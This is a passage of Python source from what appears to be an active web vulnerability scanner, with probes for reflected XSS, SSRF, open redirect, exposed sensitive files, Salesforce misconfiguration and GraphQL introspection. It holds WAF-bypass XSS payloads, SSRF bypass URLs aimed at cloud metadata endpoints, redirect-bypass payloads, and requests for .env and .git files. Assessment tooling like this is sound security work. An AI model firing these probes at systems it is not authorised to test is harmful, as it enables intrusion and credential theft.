                            follow_url = f"https://{host}{link_href}"
                        elif link_href.startswith("http"):
                            follow_url = link_href
                        else:
                            seed_p = _urlparse(seed_page)
                            seed_dir = seed_p.path.rsplit("/", 1)[0] if "/" in (seed_p.path or "") else ""
                            follow_url = f"{seed_p.scheme}://{seed_p.netloc}{seed_dir}/{link_href}"

                        try:
                            sub_resp = await http_client.get(
                                follow_url, timeout=10.0,
                                follow_redirects=True,
                                headers=_PROBE_HEADERS,
                            )
                            sub_ctx = _classify_canary_context(
                                sub_resp.text[:200_000], canary)
                            if sub_ctx:
                                sub_parsed = _urlparse(follow_url)
                                sub_base = f"{sub_parsed.scheme}://{sub_parsed.netloc}{sub_parsed.path or '/'}"
                                param_tpl = "?" + param + "={canary}"
                                reflection_points.append(
                                    (param, param_tpl, sub_ctx, sub_base))
                                _progress("active_baseline_step", {
                                    "host": host,
                                    "step": "xss_propagation_reflection",
                                    "param": param, "context": sub_ctx,
                                    "seed_page": seed_page,
                                    "source_url": sub_base,
                                })
                                _found_prop = True
                                break
                        except Exception:
                            continue
                except Exception:
                    continue

        if not reflection_points:
            continue

        # ── Step 3: Payload escalation per context ────────────────
        for param_name, param_tpl, ctx, source_base in reflection_points[:10]:
            if ctx in ("script_block", "event_handler_attr", "javascript_uri"):
                payloads = [
                    (lbl, tpl.replace("{C}", "alert(1)"))
                    for lbl, tpl in _XSS_JS_PAYLOADS
                ]
            elif ctx == "html_attribute":
                payloads = list(_XSS_ATTR_PAYLOADS)
            else:
                payloads = list(_XSS_HTML_PAYLOADS)

            for payload_label, payload in payloads:
                if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                    break
                filled_tpl = param_tpl.format(canary=payload)
                if filled_tpl.startswith("/"):
                    test_url = f"{source_base}{filled_tpl}"
                elif "?" in source_base:
                    test_url = f"{source_base}&{filled_tpl.lstrip('?')}"
                else:
                    test_url = f"{source_base}{filled_tpl}"
                try:
                    resp = await http_client.get(
                        test_url, timeout=10.0, follow_redirects=True,
                        headers=_PROBE_HEADERS,
                    )
                    body = resp.text[:200_000]
                except Exception:
                    continue

                if payload not in body:
                    continue

                if ctx in ("script_block", "event_handler_attr", "javascript_uri"):
                    sev = "Critical"
                    title = (
                        f"Reflected XSS via JavaScript Context Breakout "
                        f"({param_name}, {ctx})"
                    )
                    evidence = (
                        f"User input from parameter '{param_name}' (dynamically "
                        f"discovered on {host}) is reflected unencoded inside a "
                        f"{ctx.replace('_', ' ')}. Payload '{payload_label}' "
                        f"bypasses WAF by avoiding <, >, =, /, comma and breaking "
                        f"out of the JS string context: {payload}"
                    )
                else:
                    sev = "High"
                    title = f"Reflected XSS via {param_name}"
                    evidence = (
                        f"Payload '{payload_label}' reflected unencoded in the "
                        f"response body when injected via parameter '{param_name}' "
                        f"(dynamically discovered on {host}): {payload}"
                    )

                f = {
                    "title": title,
                    "severity": sev,
                    "confidence": "High",
                    "owasp_category": "A03:2021",
                    "cwe": "CWE-79",
                    "url": test_url,
                    "parameter": param_name,
                    "payload": payload,
                    "evidence": evidence,
                    "remediation": (
                        "Context-aware encode all user input before reflecting "
                        "it. For JS string contexts, JSON-encode then HTML-"
                        "escape; for HTML body, HTML-escape; for attribute "
                        "values, use attribute encoding. Deploy a strict "
                        "Content-Security-Policy as defense-in-depth."
                    ),
                    "phase": "Active Baseline (Reflected XSS)",
                    "tool": "active_baseline.reflected_xss_probe",
                    "_finding_source": "active_baseline",
                    "_payload_label": payload_label,
                    "_xss_context": ctx,
                }
                findings.append(f)
                _emit(f)
                break

    _progress("active_baseline_end", {
        "probe": "reflected_xss", "findings": len(findings),
    })
    return findings


# ═══════════════════════════════════════════════════════════════════════
# GAP 4 — SSRF Bypass Probe (Dynamic Discovery)
# ═══════════════════════════════════════════════════════════════════════
#
# Dynamically discovers URL-accepting parameters on the target page,
# then tests each with cloud metadata / internal IP bypass payloads.
# No hardcoded param list — discovery is based on:
#   a) Page HTML parsing (same as XSS discovery)
#   b) Semantic filtering: params whose NAME or VALUE suggest URL input.

_SSRF_PARAM_NAME_HINTS = _re.compile(
    r"(url|uri|href|link|src|redirect|redir|next|goto|dest|target"
    r"|return|callback|proxy|fetch|path|endpoint|resource|load|open"
    r"|file|page|site|domain|host|image|img|icon|logo|download|ref)",
    _re.IGNORECASE,
)

_SSRF_PAYLOADS: list[tuple[str, str, str]] = [
    ("aws_metadata_plain", "http://169.254.169.254/latest/meta-data/", "ami-id"),
    ("aws_metadata_hex", "http://0xa9fea9fe/latest/meta-data/", "ami-id"),
    ("aws_metadata_decimal", "http://2852039166/latest/meta-data/", "ami-id"),
    ("aws_metadata_ipv6", "http://[::ffff:169.254.169.254]/latest/meta-data/", "ami-id"),
    ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/", "attributes"),
    ("localhost_127001", "http://127.0.0.1:80/", ""),
    ("localhost_hex", "http://0x7f000001/", ""),
    ("localhost_decimal", "http://2130706433/", ""),
    ("localhost_ipv6", "http://[::1]/", ""),
    ("localhost_short", "http://127.1/", ""),
    ("localhost_0000", "http://0.0.0.0/", ""),
]

_SSRF_FALLBACK_PARAMS = ["url", "redirect", "next", "target", "dest",
                         "callback", "path", "proxy", "fetch"]


def _discover_ssrf_params(html: str) -> list[str]:
    """From page HTML, discover params likely to accept URLs.

    Strategy:
      1. Parse all param names from the page (same as XSS discovery).
      2. Also find params whose VALUES look like URLs (http/https//).
      3. Filter by name heuristic (the name regex above).
      4. Return deduplicated list.
    """
    all_params = _discover_params_from_html(html, "")

    url_value_params: set[str] = set()
    for m in _re.finditer(
        r'[?&]([A-Za-z_][A-Za-z0-9_-]{0,40})=(https?%3[Aa]|https?://|//)',
        html,
    ):
        url_value_params.add(m.group(1).lower())

    candidates: set[str] = set()
    for p in all_params:
        if _SSRF_PARAM_NAME_HINTS.search(p):
            candidates.add(p)
    candidates.update(url_value_params)
    return sorted(candidates) if candidates else list(_SSRF_FALLBACK_PARAMS)


async def run_ssrf_probe(
    http_client,
    hosts: Iterable[str],
    *,
    crawled_urls: Iterable[str] | None = None,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Probe each host for SSRF using dynamically discovered URL params."""
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        return findings

    from urllib.parse import urlparse as _urlparse, parse_qs as _parse_qs
    _crawled_by_host: dict[str, list[str]] = {}
    for curl in (crawled_urls or []):
        try:
            h = (_urlparse(curl).hostname or "").lower()
            if h:
                _crawled_by_host.setdefault(h, []).append(curl)
        except Exception:
            continue

    _progress("active_baseline_start", {
        "probe": "ssrf_bypass", "hosts": len(targets),
    })

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            break
        base_url = f"https://{host}"

        # Discover URL-accepting params from root + crawled pages
        combined_html = ""
        try:
            page_resp = await http_client.get(
                base_url, timeout=10.0, follow_redirects=True,
                headers=_PROBE_HEADERS,
            )
            combined_html = page_resp.text[:500_000]
        except Exception:
            pass

        for curl in _crawled_by_host.get(host, [])[:20]:
            try:
                parsed = _urlparse(curl)
                for k in _parse_qs(parsed.query or ""):
                    combined_html += f' href="?{k}=https://x"'
                cresp = await http_client.get(
                    curl, timeout=8.0, follow_redirects=True,
                    headers=_PROBE_HEADERS,
                )
                combined_html += cresp.text[:300_000]
            except Exception:
                continue

        ssrf_params = _discover_ssrf_params(combined_html)
        _progress("active_baseline_step", {
            "host": host, "step": "ssrf_params_discovered",
            "count": len(ssrf_params), "params": ssrf_params[:20],
        })

        for param in ssrf_params[:15]:
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            benign_url = f"{base_url}?{param}=https://example.com/"
            try:
                benign_resp = await http_client.get(
                    benign_url, timeout=10.0, follow_redirects=False,
                    headers=_PROBE_HEADERS,
                )
                benign_status = benign_resp.status_code
            except Exception:
                continue

            if benign_status in (404, 405, 501):
                continue

            for payload_label, payload_url, fingerprint in _SSRF_PAYLOADS:
                if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                    break
                test_url = f"{base_url}?{param}={payload_url}"
                try:
                    resp = await http_client.get(
                        test_url, timeout=10.0, follow_redirects=False,
                        headers=_PROBE_HEADERS,
                    )
                    body = resp.text[:100_000]
                    status = resp.status_code
                except Exception:
                    continue

                is_ssrf = False
                evidence_detail = ""

                if fingerprint and fingerprint in body:
                    is_ssrf = True
                    evidence_detail = (
                        f"Cloud metadata fingerprint '{fingerprint}' in response."
                    )
                elif (status == 200 and benign_status != 200
                      and len(body) > 100
                      and "169.254" not in str(benign_resp.text[:1000])):
                    is_ssrf = True
                    evidence_detail = (
                        f"Status changed from {benign_status} (benign) to "
                        f"{status} (SSRF payload). Body length: {len(body)}."
                    )

                if not is_ssrf:
                    continue

                f = {
                    "title": f"SSRF via {param} ({payload_label})",
                    "severity": "Critical" if "metadata" in payload_label else "High",
                    "confidence": "High" if fingerprint else "Medium",
                    "owasp_category": "A10:2021",
                    "cwe": "CWE-918",
                    "url": test_url,
                    "parameter": param,
                    "payload": payload_url,
                    "evidence": (
                        f"SSRF bypass payload '{payload_label}' ({payload_url}) "
                        f"injected via dynamically discovered param '{param}'. "
                        f"{evidence_detail}"
                    ),
                    "remediation": (
                        "Validate and sanitize all URL inputs server-side. "
                        "Use an allow-list of permitted domains/IPs. "
                        "Block requests to internal IP ranges (169.254.x.x, "
                        "127.x.x.x, 10.x.x.x, ::1, etc.) at the network level. "
                        "Disable cloud metadata access from application containers."
                    ),
                    "phase": "Active Baseline (SSRF Bypass)",
                    "tool": "active_baseline.ssrf_probe",
                    "_finding_source": "active_baseline",
                    "_payload_label": payload_label,
                }
                findings.append(f)
                _emit(f)
                break

    _progress("active_baseline_end", {
        "probe": "ssrf_bypass", "findings": len(findings),
    })
    return findings


# ═══════════════════════════════════════════════════════════════════════
# GAP 5 — Open Redirect Probe
# ═══════════════════════════════════════════════════════════════════════
#
# Bug bounty researchers find open redirects in parameters like
# ?redirect=, ?next=, ?url=, ?dest=, ?lp= that accept external URLs.
# This probe discovers redirect-like params and tests with an external canary.

_REDIRECT_PARAM_HINTS = _re.compile(
    r"(redirect|redir|next|url|goto|dest|target|return|returnurl"
    r"|continue|forward|out|link|to|ref|lp|callback|_externalContentRedirect"
    r"|ReturnUrl|backUrl|back_url|successUrl|failUrl|errorUrl|cancelUrl)",
    _re.IGNORECASE,
)

_REDIRECT_CANARY_DOMAIN = "evil.example.com"
_REDIRECT_PAYLOADS: list[tuple[str, str]] = [
    ("plain_url", f"https://{_REDIRECT_CANARY_DOMAIN}/redir"),
    ("double_slash", f"//{_REDIRECT_CANARY_DOMAIN}/redir"),
    ("backslash_bypass", f"https://{_REDIRECT_CANARY_DOMAIN}%2f.."),
    ("at_bypass", f"https://legitimate.com@{_REDIRECT_CANARY_DOMAIN}/"),
    ("null_byte", f"https://{_REDIRECT_CANARY_DOMAIN}/%00"),
    ("encoded_slash", f"https:%2F%2F{_REDIRECT_CANARY_DOMAIN}/redir"),
]


async def run_open_redirect_probe(
    http_client,
    hosts: Iterable[str],
    *,
    crawled_urls: Iterable[str] | None = None,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Probe each host for open redirect via dynamically discovered params."""
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        return findings

    from urllib.parse import urlparse as _urlparse, parse_qs as _parse_qs
    _crawled_by_host: dict[str, list[str]] = {}
    for curl in (crawled_urls or []):
        try:
            h = (_urlparse(curl).hostname or "").lower()
            if h:
                _crawled_by_host.setdefault(h, []).append(curl)
        except Exception:
            continue

    _progress("active_baseline_start", {
        "probe": "open_redirect", "hosts": len(targets),
    })

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            break
        base_url = f"https://{host}"

        discovered: set[str] = set()
        try:
            page_resp = await http_client.get(
                base_url, timeout=10.0, follow_redirects=True,
                headers=_PROBE_HEADERS,
            )
            discovered.update(_discover_params_from_html(page_resp.text[:500_000], base_url))
        except Exception:
            pass

        for curl in _crawled_by_host.get(host, [])[:20]:
            try:
                parsed = _urlparse(curl)
                for k in _parse_qs(parsed.query or ""):
                    discovered.add(k.lower())
                cresp = await http_client.get(
                    curl, timeout=8.0, follow_redirects=True, headers=_PROBE_HEADERS,
                )
                discovered.update(_discover_params_from_html(cresp.text[:300_000], curl))
            except Exception:
                continue

        redirect_params = [p for p in discovered if _REDIRECT_PARAM_HINTS.search(p)]
        if not redirect_params:
            redirect_params = ["redirect", "next", "url", "dest", "returnurl", "lp"]

        for param in redirect_params[:10]:
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            for payload_label, payload_url in _REDIRECT_PAYLOADS:
                test_url = f"{base_url}?{param}={payload_url}"
                try:
                    resp = await http_client.get(
                        test_url, timeout=10.0, follow_redirects=False,
                        headers=_PROBE_HEADERS,
                    )
                except Exception:
                    continue

                is_redirect = False
                location = str(resp.headers.get("location", ""))

                if resp.status_code in (301, 302, 303, 307, 308):
                    if _REDIRECT_CANARY_DOMAIN in location:
                        is_redirect = True

                if _REDIRECT_CANARY_DOMAIN in resp.text[:50_000]:
                    meta_match = _re.search(
                        r'<meta[^>]*http-equiv\s*=\s*["\']?refresh[^>]*'
                        + _re.escape(_REDIRECT_CANARY_DOMAIN),
                        resp.text[:50_000], _re.IGNORECASE,
                    )
                    if meta_match:
                        is_redirect = True

                if not is_redirect:
                    continue

                f = {
                    "title": f"Open Redirect via {param}",
                    "severity": "Medium",
                    "confidence": "High",
                    "owasp_category": "A01:2021",
                    "cwe": "CWE-601",
                    "url": test_url,
                    "parameter": param,
                    "payload": payload_url,
                    "evidence": (
                        f"Server responds with {resp.status_code} redirecting to "
                        f"'{location}' when '{param}' is set to an external URL. "
                        f"Payload variant: {payload_label}."
                    ),
                    "remediation": (
                        "Validate redirect destinations against an allow-list of "
                        "permitted domains. Never use user-controlled input directly "
                        "in Location headers or meta refresh tags."
                    ),
                    "phase": "Active Baseline (Open Redirect)",
                    "tool": "active_baseline.open_redirect_probe",
                    "_finding_source": "active_baseline",
                    "_payload_label": payload_label,
                }
                findings.append(f)
                _emit(f)
                break

    _progress("active_baseline_end", {
        "probe": "open_redirect", "findings": len(findings),
    })
    return findings


# ═══════════════════════════════════════════════════════════════════════
# GAP 6 — Sensitive Path / Info Disclosure Probe
# ═══════════════════════════════════════════════════════════════════════
#
# Checks for well-known sensitive paths: phpinfo, .env, .git/config,
# debug endpoints, status pages, etc. that leak server configuration.

_SENSITIVE_PATHS: list[tuple[str, str, list[str]]] = [
    ("phpinfo", "/index.php", ["phpinfo()", "PHP Version", "System =>"]),
    ("phpinfo_info", "/info.php", ["phpinfo()", "PHP Version"]),
    ("phpinfo_test", "/test.php", ["phpinfo()", "PHP Version"]),
    ("phpinfo_phpinfo", "/phpinfo.php", ["phpinfo()", "PHP Version"]),
    ("dotenv", "/.env", ["DB_PASSWORD", "APP_KEY", "SECRET"]),
    ("git_config", "/.git/config", ["[core]", "[remote"]),
    ("git_head", "/.git/HEAD", ["ref: refs/"]),
    ("ds_store", "/.DS_Store", []),
    ("wp_config_bak", "/wp-config.php.bak", ["DB_NAME", "DB_PASSWORD"]),
    ("server_status", "/server-status", ["Apache Server Status", "Total accesses"]),
    ("debug_vars", "/debug/vars", []),
    ("actuator", "/actuator", ["_links", "self"]),
    ("actuator_env", "/actuator/env", ["activeProfiles", "propertySources"]),
    ("elmah", "/elmah.axd", ["Error Log for"]),
    ("trace", "/trace", []),
    ("swagger_json", "/swagger.json", ["swagger", "paths"]),
    ("api_docs", "/api-docs", ["swagger", "openapi"]),
    ("graphql", "/graphql", []),
    ("robots_txt", "/robots.txt", ["Disallow"]),
    ("sitemap", "/sitemap.xml", ["<urlset", "<sitemapindex"]),
]


async def run_sensitive_path_probe(
    http_client,
    hosts: Iterable[str],
    *,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Check each host for well-known sensitive/debug paths."""
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        return findings

    _progress("active_baseline_start", {
        "probe": "sensitive_paths", "hosts": len(targets),
    })

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            break

        for path_label, path, fingerprints in _SENSITIVE_PATHS:
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            test_url = f"https://{host}{path}"
            try:
                resp = await http_client.get(
                    test_url, timeout=8.0, follow_redirects=True,
                    headers=_PROBE_HEADERS,
                )
            except Exception:
                continue

            if resp.status_code != 200:
                continue

            body = resp.text[:100_000]
            if not fingerprints:
                if resp.status_code == 200 and len(body) > 100:
                    if path_label in ("ds_store", "debug_vars", "trace", "graphql"):
                        pass
                    else:
                        continue
                else:
                    continue

            matched = [fp for fp in fingerprints if fp.lower() in body.lower()]
            if not matched and fingerprints:
                continue

            if path_label.startswith("phpinfo"):
                sev = "High"
                title = f"PHP Information Disclosure ({path})"
                cwe = "CWE-200"
            elif path_label in ("dotenv", "wp_config_bak"):
                sev = "Critical"
                title = f"Sensitive Configuration File Exposed ({path})"
                cwe = "CWE-538"
            elif path_label.startswith("git"):
                sev = "High"
                title = f"Git Repository Exposed ({path})"
                cwe = "CWE-538"
            elif path_label.startswith("actuator"):
                sev = "High"
                title = f"Spring Actuator Exposed ({path})"
                cwe = "CWE-200"
            else:
                sev = "Medium"
                title = f"Sensitive Path Accessible ({path})"
                cwe = "CWE-200"

            f = {
                "title": title,
                "severity": sev,
                "confidence": "High" if matched else "Medium",
                "owasp_category": "A01:2021",
                "cwe": cwe,
                "url": test_url,
                "parameter": path,
                "payload": f"GET {path}",
                "evidence": (
                    f"Path '{path}' returned HTTP {resp.status_code} with "
                    f"fingerprints: {matched or 'content present'}. "
                    f"Content-Type: {resp.headers.get('content-type', 'n/a')}. "
                    f"Body preview: {body[:200]}"
                ),
                "remediation": (
                    f"Remove or restrict access to '{path}'. For phpinfo, "
                    f"delete the file in production. For .env/.git, add deny "
                    f"rules to the web server configuration."
                ),
                "phase": "Active Baseline (Sensitive Paths)",
                "tool": "active_baseline.sensitive_path_probe",
                "_finding_source": "active_baseline",
                "_path_label": path_label,
            }
            findings.append(f)
            _emit(f)

    _progress("active_baseline_end", {
        "probe": "sensitive_paths", "findings": len(findings),
    })
    return findings


# ═══════════════════════════════════════════════════════════════════════
# GAP 7 — Salesforce Misconfiguration Probe
# ═══════════════════════════════════════════════════════════════════════
#
# Detects Salesforce Experience Cloud/Community instances and probes
# for common misconfigurations: exposed Aura endpoints, public object
# access, and PII-leaking API endpoints.

_SALESFORCE_DOMAIN_PATTERNS = [
    _re.compile(r"\.my\.site\.com$", _re.IGNORECASE),
    _re.compile(r"\.force\.com$", _re.IGNORECASE),
    _re.compile(r"\.salesforce\.com$", _re.IGNORECASE),
    _re.compile(r"\.my\.salesforce\.com$", _re.IGNORECASE),
    _re.compile(r"\.sandbox\.my\.site\.com$", _re.IGNORECASE),
]

_SALESFORCE_AURA_PATHS = [
    "/s/sfsites/aura",
    "/aura",
]

_SALESFORCE_OBJECTS_TO_PROBE = [
    "Account", "Contact", "Case", "Lead", "Opportunity",
    "Article_Feedback__c", "Knowledge__kav",
    "User", "Task", "Event", "ContentDocument",
]

_SALESFORCE_API_VERSIONS = ["v58.0", "v57.0", "v56.0", "v55.0"]


def _is_salesforce_host(host: str) -> bool:
    """Check if a hostname looks like a Salesforce instance."""
    return any(p.search(host) for p in _SALESFORCE_DOMAIN_PATTERNS)


async def run_salesforce_probe(
    http_client,
    hosts: Iterable[str],
    *,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Detect Salesforce instances and probe for misconfigurations."""
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        return findings

    _progress("active_baseline_start", {
        "probe": "salesforce_misconfig", "hosts": len(targets),
    })

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            break

        # Step 1: Check if Salesforce (by domain or by response headers/body)
        is_sf = _is_salesforce_host(host)
        sf_evidence = []

        if not is_sf:
            try:
                resp = await http_client.get(
                    f"https://{host}/", timeout=10.0, follow_redirects=True,
                    headers=_PROBE_HEADERS,
                )
                body = resp.text[:100_000].lower()
                hdrs = str(resp.headers).lower()
                if any(x in body for x in [
                    "salesforce", "lightning", "aura", "sfdc",
                    "community-", "sfdcpage",
                ]):
                    is_sf = True
                    sf_evidence.append("Salesforce markers in page body")
                if "x-sfdc" in hdrs or "sfdc" in hdrs:
                    is_sf = True
                    sf_evidence.append("SFDC headers detected")
            except Exception:
                continue

        if not is_sf:
            continue

        _progress("active_baseline_step", {
            "host": host, "step": "salesforce_detected",
            "evidence": sf_evidence or ["domain pattern match"],
        })

        base_url = f"https://{host}"

        # Step 2: Probe Aura endpoint (unauthenticated)
        for aura_path in _SALESFORCE_AURA_PATHS:
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            aura_url = f"{base_url}{aura_path}"
            try:
                aura_payload = {
                    "message": '{"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/getObjectInfo","params":{"objectApiName":"Account"}}]}',
                    "aura.context": '{"mode":"PROD","fwuid":"1"}',
                    "aura.token": "null",
                }
                resp = await http_client.post(
                    aura_url, data=aura_payload, timeout=10.0,
                    headers={**_PROBE_HEADERS, "Content-Type": "application/x-www-form-urlencoded"},
                )
                body = resp.text[:50_000]
            except Exception:
                continue

            if resp.status_code == 200 and ('"actions"' in body or '"objectInfos"' in body):
                f = {
                    "title": f"Salesforce Aura Endpoint Exposed ({aura_path})",
                    "severity": "High",
                    "confidence": "High",
                    "owasp_category": "A01:2021",
                    "cwe": "CWE-284",
                    "url": aura_url,
                    "parameter": "aura.token=null",
                    "payload": "getObjectInfo(Account)",
                    "evidence": (
                        f"Aura endpoint at {aura_path} responds with object metadata "
                        f"when accessed without authentication. Status: {resp.status_code}. "
                        f"Body preview: {body[:300]}"
                    ),
                    "remediation": (
                        "Restrict Aura endpoint access with proper guest user "
                        "permissions. Review Salesforce sharing rules and ensure "
                        "guest users cannot access sensitive objects."
                    ),
                    "phase": "Active Baseline (Salesforce)",
                    "tool": "active_baseline.salesforce_probe",
                    "_finding_source": "active_baseline",
                }
                findings.append(f)
                _emit(f)

        # Step 3: Probe REST API for public object access
        for api_ver in _SALESFORCE_API_VERSIONS[:2]:
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            api_base = f"{base_url}/services/data/{api_ver}"
            try:
                api_resp = await http_client.get(
                    api_base, timeout=10.0, follow_redirects=True,
                    headers=_PROBE_HEADERS,
                )
                if api_resp.status_code != 200:
                    continue
            except Exception:
                continue

            f = {
                "title": "Salesforce REST API Publicly Accessible",
                "severity": "Critical",
                "confidence": "High",
                "owasp_category": "A01:2021",
                "cwe": "CWE-284",
                "url": api_base,
                "parameter": f"/services/data/{api_ver}",
                "payload": f"GET /services/data/{api_ver}",
                "evidence": (
                    f"Salesforce REST API at {api_base} returned HTTP "
                    f"{api_resp.status_code} without authentication. "
                    f"Body: {api_resp.text[:300]}"
                ),
                "remediation": (
                    "Restrict API access to authenticated users. Configure "
                    "guest user profiles to deny API access. Review org-wide "
                    "sharing defaults."
                ),
                "phase": "Active Baseline (Salesforce)",
                "tool": "active_baseline.salesforce_probe",
                "_finding_source": "active_baseline",
            }
            findings.append(f)
            _emit(f)

            for obj in _SALESFORCE_OBJECTS_TO_PROBE:
                if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                    break
                obj_url = f"{api_base}/sobjects/{obj}/describe"
                try:
                    obj_resp = await http_client.get(
                        obj_url, timeout=8.0, follow_redirects=True,
                        headers=_PROBE_HEADERS,
                    )
                    if obj_resp.status_code == 200:
                        obj_body = obj_resp.text[:20_000]
                        if '"fields"' in obj_body or '"name"' in obj_body:
                            f = {
                                "title": f"Salesforce Object '{obj}' Schema Publicly Accessible",
                                "severity": "High",
                                "confidence": "High",
                                "owasp_category": "A01:2021",
                                "cwe": "CWE-284",
                                "url": obj_url,
                                "parameter": f"sobjects/{obj}/describe",
                                "payload": f"GET {obj_url}",
                                "evidence": (
                                    f"Object '{obj}' schema is accessible without auth. "
                                    f"Response includes field definitions. "
                                    f"Preview: {obj_body[:200]}"
                                ),
                                "remediation": (
                                    f"Remove guest user access to '{obj}'. Review "
                                    f"field-level security and object permissions."
                                ),
                                "phase": "Active Baseline (Salesforce)",
                                "tool": "active_baseline.salesforce_probe",
                                "_finding_source": "active_baseline",
                            }
                            findings.append(f)
                            _emit(f)
                except Exception:
                    continue
            break

        # Step 4: Check for staging/sandbox exposure
        if "sandbox" in host.lower() or "stg" in host.lower() or "stage" in host.lower():
            f = {
                "title": f"Salesforce Staging/Sandbox Publicly Accessible ({host})",
                "severity": "High",
                "confidence": "Medium",
                "owasp_category": "A05:2021",
                "cwe": "CWE-200",
                "url": base_url,
                "parameter": "hostname",
                "payload": host,
                "evidence": (
                    f"Host '{host}' appears to be a Salesforce staging/sandbox "
                    f"environment that is publicly accessible. Staging environments "
                    f"may contain production data clones including PII."
                ),
                "remediation": (
                    "Restrict sandbox access via IP allowlisting. Ensure "
                    "sandbox data is anonymized. Never clone production PII "
                    "into staging."
                ),
                "phase": "Active Baseline (Salesforce)",
                "tool": "active_baseline.salesforce_probe",
                "_finding_source": "active_baseline",
            }
            findings.append(f)
            _emit(f)

    _progress("active_baseline_end", {
        "probe": "salesforce_misconfig", "findings": len(findings),
    })
    return findings


# ═══════════════════════════════════════════════════════════════════════
# GAP 8 — GraphQL Introspection Probe
# ═══════════════════════════════════════════════════════════════════════
#
# Many GraphQL endpoints ship with introspection enabled in production,
# leaking the entire schema (types, queries, mutations, internal fields).
# This probe sends the standard introspection query to common GraphQL
# paths and flags any endpoint that returns a valid schema.

_GRAPHQL_PATHS = [
    "/graphql", "/graphql/", "/graphiql", "/api/graphql",
    "/v1/graphql", "/v2/graphql", "/query", "/gql",
]

_INTROSPECTION_QUERY = '{"query":"{ __schema { types { name fields { name } } } }"}'

_INTROSPECTION_FULL = (
    '{"query":"{ __schema { queryType { name } mutationType { name } '
    'subscriptionType { name } types { name kind description fields(includeDeprecated:true) '
    '{ name args { name type { name kind ofType { name kind } } } type { name kind '
    'ofType { name kind } } } } directives { name description locations args '
    '{ name type { name kind ofType { name kind } } } } } }"}'
)


async def run_graphql_introspection_probe(
    http_client,
    hosts: Iterable[str],
    *,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Probe each host for enabled GraphQL introspection."""
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        return findings

    _progress("active_baseline_start", {
        "probe": "graphql_introspection", "hosts": len(targets),
    })

    gql_headers = {**_PROBE_HEADERS, "Content-Type": "application/json"}

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            break

        for gql_path in _GRAPHQL_PATHS:
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            url = f"https://{host}{gql_path}"
            try:
                resp = await http_client.post(
                    url, content=_INTROSPECTION_QUERY, timeout=10.0,
                    headers=gql_headers,
                )
                body = resp.text[:100_000]
            except Exception:
                continue

            if resp.status_code != 200:
                continue

            has_schema = '"__schema"' in body and '"types"' in body
            if not has_schema:
                # Try GET with query param (some servers prefer this)
                try:
                    get_resp = await http_client.get(
                        f"{url}?query={{__schema{{types{{name}}}}}}",
                        timeout=10.0, headers=_PROBE_HEADERS,
                    )
                    body = get_resp.text[:100_000]
                    has_schema = '"__schema"' in body and '"types"' in body
                except Exception:
                    pass

            if not has_schema:
                continue

            # Count types and mutations for evidence
            type_count = body.count('"name"')
            has_mutations = '"mutationType"' in body and body.count('"mutationType":null') == 0

            sev = "High" if has_mutations else "Medium"

            f = {
                "title": f"GraphQL Introspection Enabled ({gql_path})",
                "severity": sev,
                "confidence": "High",
                "owasp_category": "A01:2021",
                "cwe": "CWE-200",
                "url": url,
                "parameter": gql_path,
                "payload": "{ __schema { types { name fields { name } } } }",
                "evidence": (
                    f"GraphQL introspection is enabled at {url}. "
                    f"Schema exposes ~{type_count} named fields. "
                    f"Mutations exposed: {'yes' if has_mutations else 'no'}. "
                    f"Body preview: {body[:300]}"
                ),
                "remediation": (
                    "Disable introspection in production by setting "
                    "introspection: false in your GraphQL server config. "
                    "Use schema-level authorization for all queries and mutations."
                ),
                "phase": "Active Baseline (GraphQL Introspection)",
                "tool": "active_baseline.graphql_introspection_probe",
                "_finding_source": "active_baseline",
            }
            findings.append(f)
            _emit(f)
            break  # one hit per host is enough

    _progress("active_baseline_end", {
        "probe": "graphql_introspection", "findings": len(findings),
    })
    return findings


# ═══════════════════════════════════════════════════════════════════════
# GAP 9 — HTTP Request Smuggling Baseline Probes
# ═══════════════════════════════════════════════════════════════════════
#
# Tests for CL-TE and TE-CL desync by sending ambiguous Content-Length
# and Transfer-Encoding headers. A successful smuggle causes the front-
# end and back-end to disagree on message boundaries, which an attacker
# can exploit for cache poisoning, auth bypass, or request hijacking.
#
# These probes use a *timing-based* detection method (like the SQLi
# probe): the smuggled suffix is a partial request that causes the
# back-end to wait for the next bytes, introducing a measurable delay.

